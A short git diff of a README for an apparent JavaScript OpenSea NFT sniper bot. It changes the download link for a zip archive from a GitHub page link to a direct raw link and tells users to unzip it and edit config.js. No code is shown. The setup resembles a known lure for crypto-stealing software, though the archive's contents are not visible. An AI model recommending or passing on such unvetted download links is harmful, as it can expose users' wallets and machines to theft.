@@ -3,7 +3,7 @@ This is simple but highly effective JavaScript Opensea NFT Sniper bot. It should
 
 <b>Steps to setting it up</b>
 <ol><li>
-Download and unzip folder in an easy accessible location for you. You can get it here https://github.com/lexingtondavid46/opeasea-nft-sniper-javascript-bot/blob/main/opensea-nft-sniper.zip
+Download and unzip folder in an easy accessible location for you. You can get it here https://github.com/lexingtondavid46/opeasea-nft-sniper-javascript-bot/raw/main/opensea-nft-sniper.zip
 </li><li>
 
 In the unzip folder you will find config.js you will need to edit this in a text editor to configure the settings. This should be simple and straightforward enough.
